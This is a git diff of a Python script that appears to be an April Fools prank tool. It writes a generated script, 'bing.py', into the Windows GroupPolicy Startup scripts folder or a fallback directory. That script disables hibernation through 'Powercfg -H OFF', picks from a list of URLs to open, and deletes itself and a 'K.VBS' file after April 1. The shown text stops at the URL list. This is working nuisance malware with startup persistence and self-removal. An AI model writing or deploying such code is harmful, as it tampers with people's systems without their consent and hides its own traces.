@@ -1,21 +1,26 @@
+#V3.2
 import os
-try:
-	os.chdir("C:/Windows/System32/GroupPolicy/Machine/Scripts/Startup")
-	print("main")
-	
-except:
-	try:
-		os.chdir("C:/Users/Public/Documents")
-		print("doc")
-		
-		
-	except:
-		try:
-			os.chdir("F:")
-		except:
-			print("defalt directry not found")
-			print("input new directry")
-			os.chdir(input())
+import time
+directry=["C:/Windows/System32/GroupPolicy/Machine/Scripts/Startup","C:/Users/Public/Documents","F:"]
+for i in directry:
+        try:
+                os.chdir(str(i))
+                print("main")
+                break               
+        except:
+                print("directry not found")
+
+                
+
+
+
+
+
+
+
+
+
+
 f=open("bing.py","w")
 f.write('import datetime\nimport webbrowser\nimport os\nimport time\nimport random\ncounter=0\nx = datetime.datetime.now()\nif x.strftime("%m %d") == "04 01":\n	april=True\nelif int(x.strftime("%m%d")) >=int(401):\n        os.remove("K.VBS")\n        os.remove("bing.py")\n        exit\nelse:\n	april=False\n	print("not today")\nos.system("Powercfg -H OFF")\nbrake=random.randint(1, 20)\n')
 f.write('print(brake)\nspear_url=["facebook.com","youtube.com","kgsorkney.com","wikipedia.org","baidu.com","hamishknox.co.uk","reddit.com","yahoo.com","coca-cola.co.uk","netflix.com"]')
